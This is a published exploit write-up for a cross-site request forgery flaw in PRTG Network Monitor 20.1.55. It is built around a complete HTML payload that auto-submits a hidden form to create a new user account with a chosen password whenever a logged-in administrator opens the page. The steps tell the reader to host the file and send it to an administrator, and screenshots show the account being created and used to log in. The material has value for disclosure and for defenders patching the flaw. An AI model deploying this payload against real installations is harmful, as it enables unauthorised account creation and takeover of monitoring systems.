# PRTG Network Monitoor v20.1.55 - CSRF
Cross Site Request Forgery (CSRF) on PRTG Network Monitor version 20.1.55

Exploit Title: Cross Site Request Forgery (CSRF)  
Date: 10/06/2021  
Exploit Author: Likhith CV  
Vendor Homepage: https://www.paessler.com/  
Software Link: https://www.paessler.com/prtg  
Test on Version: 20.1.55.1775+  
Affected Versions: not tested on other versions  


## Observation
It was observed that anti csrf tokens are not implemented throughout PRTG Network Monitor v 20.1.55 Application

Severity: High

## Steps To reproduce:

To exploit this vulnerability an attacker can simply create a HTML form that would submit a user account creation request and share the link with the victim.On clicking the link , the user account creation request will be triggered in background and it shall create a user account from his valid session.

Any action can be performed on behalf of logged in user but for demonstration user account creation on behalf of admin is shown as example


1. Create a CSRF payload as following
```javascript
<html>
  <body onload="onLoadSubmit()">
  <script>history.pushState('', '', '/')</script>
    <form action="https://[domain]/editsettings" name="cu2" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="login&#95;" value="User&#95;test2" />			<!--username-->
      <input type="hidden" name="name&#95;" value="User&#95;test2" />			<!--name-->
      <input type="hidden" name="email&#95;" value="cvlikhith&#64;gmail&#46;com" />		<!--email-->
      <input type="hidden" name="email" value="" />
      <input type="hidden" name="passwordradio" value="1" />
      <input type="hidden" name="password1" value="Hello123" />				<!--password-->
      <input type="hidden" name="password&#95;" value="" />					<!--confirm_password-->
      <input type="hidden" name="password2" value="Hello123" />
      <input type="hidden" name="passhash" value="" />
      <input type="hidden" name="lastackedsensordeprecationgrowl" value="" />
      <input type="hidden" name="usertype&#95;" value="0" />
      <input type="hidden" name="allowack&#95;" value="0" />
      <input type="hidden" name="allowpwchange&#95;" value="0" />
      <input type="hidden" name="primarygroup&#95;" value="201&#124;PRTG&#32;Users&#32;Group&#124;&#124;&#124;0&#124;" />	<!--group-->
      <input type="hidden" name="primarygroup" value="201" />
      <input type="hidden" name="active&#95;" value="1" />
      <input type="hidden" name="autorefreshtype&#95;" value="1" />
      <input type="hidden" name="autorefreshinterval&#95;" value="30" />
      <input type="hidden" name="playsound&#95;" value="0" />
      <input type="hidden" name="homepage&#95;" value="" />
      <input type="hidden" name="timezone&#95;" value="Dateline&#32;Standard&#32;Time&#124;&#40;UTC&#45;12&#58;00&#41;&#32;International&#32;Date&#32;Line&#32;West" />
      <input type="hidden" name="dateformat&#95;" value="0" />
      <input type="hidden" name="theme&#95;" value="0" />
      <input type="hidden" name="ticketmail&#95;" value="1" />
      <input type="hidden" name="objecttype" value="user" />
      <input type="hidden" name="id" value="new" />
      <input type="hidden" name="targeturl" value="&#47;systemsetup&#46;htm&#63;tabid&#61;5" />
      <input type="submit" value="Submit request" />
    </form>
	<script language="javascript">
function onLoadSubmit() {
	document.cu2.submit();
}
</script>
  </body>
</html>

```
2. Send this payload to admin of the PRTG Portal
3. once Admin opens your payload new user account will be created   

### CSRF Payload
![payload](https://user-images.githubusercontent.com/36541248/121513665-2420c100-c9fc-11eb-819f-c83a94cba544.png)

### Hosting CSRF.html on attacker server
![python_server](https://user-images.githubusercontent.com/36541248/121513670-284cde80-c9fc-11eb-8102-315033fb317f.png)

### User accounts before CSRF attack
![0](https://user-images.githubusercontent.com/36541248/121513531-005d7b00-c9fc-11eb-8346-c04737d7869f.png)

### Once the Admin opens the html, CSRF Payload is triggered and new user account "user_test2" is created
![9](https://user-images.githubusercontent.com/36541248/121513559-07848900-c9fc-11eb-8ae9-4ea660d2a35a.png)

### Testing Credentials
![testing_creds](https://user-images.githubusercontent.com/36541248/121513678-2aaf3880-c9fc-11eb-9d3b-82edacd809a7.png)

### Logged In 
![logged_in](https://user-images.githubusercontent.com/36541248/121513653-2125d080-c9fc-11eb-9285-fde0942c83e1.png)







